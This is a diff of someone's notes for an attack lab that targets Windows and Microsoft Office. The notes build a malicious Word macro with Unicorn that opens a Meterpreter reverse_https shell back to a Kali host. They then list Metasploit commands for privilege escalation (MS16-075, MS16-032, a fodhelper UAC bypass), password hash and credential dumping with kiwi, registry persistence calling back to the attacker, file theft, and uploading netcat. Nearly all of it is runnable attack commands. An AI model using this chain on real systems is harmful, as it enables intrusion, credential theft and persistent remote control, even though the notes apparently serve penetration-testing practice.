@@ -3,8 +3,7 @@ Windows 10 Version 22H2 - Build 19045.2006
 
 cscript "C:\Program Files\Microsoft Office\Office16\ospp.vbs"  /dstatus
 ---------
-Might have to use Windows XP 
-https://blog.danielburrowes.com/2024/01/windows-xp-on-proxmox.html
+Might have to use Windows XP - https://blog.danielburrowes.com/2024/01/windows-xp-on-proxmox.html
 ---------
 Setup Microsoft Word
 
@@ -30,8 +29,7 @@ curl -o msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/m
 [Install Unicorn]
 
 git clone https://github.com/trustedsec/unicorn
-cd unicorn
-python3 unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
+python3 /unicorn/unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
 
 ---------
 Copy maro powershell_attack.txt into Word attachment. 
@@ -51,26 +49,8 @@ getsystem
 background 
 
 ---------
-# 1. List active sessions
-sessions
 
-# 2. Interact with the session
-sessions -i 1
-
-# 3. Load useful extensions
-load stdapi
-load priv
-
-# 4. Check user context
-getuid
-
-# 5. Check if system privileges are available
-getsystem
-
-# 6. Background the session
-background
-
-# 7. Run local exploit suggester to find privilege escalation paths
+# Run local exploit suggester to find privilege escalation paths
 use post/multi/recon/local_exploit_suggester
 set SESSION 1
 run
@@ -78,23 +58,19 @@ run
 1   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 ------
-# 1. Use the confirmed vulnerable exploit (MS16-075)
+# Use the confirmed vulnerable exploit (MS16-075)
 use exploit/windows/local/ms16_075_reflection
 set SESSION 1
 exploit
 
-# 2. (Optional) If that fails, try the other suggested one
+# (Optional) If that fails, try the other suggested one
 use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
 set SESSION 1
 exploit
 
-# 3. After exploitation, confirm SYSTEM access again
-getuid
-
-# 4. Continue post-exploitation tasks (pivoting, dumping creds, etc.)
 ------
 
-# 8. Based on the results, choose a matching exploit (example)
+# Based on the results, choose a matching exploit (example)
 use exploit/windows/local/bypassuac_fodhelper
 set SESSION 1
 exploit
@@ -120,17 +96,17 @@ hashdump
 load kiwi
 creds_all
 
-# 8. Enable persistence (example using registry)
+# Enable persistence (example using registry)
 run persistence -U -i 5 -p 443 -r <KALI-IP>
 
 # 9. Browse files
 cd C:\
 ls
 
-# 10. Download a file
+# Download a file
 download C:\\Users\\<USERNAME>\\Desktop\\secret.txt
 
-# 11. Upload a tool (e.g., netcat)
+# Upload a tool (e.g., netcat)
 upload nc.exe C:\\Windows\\Temp\\nc.exe
 
 # 12. Open a remote shell
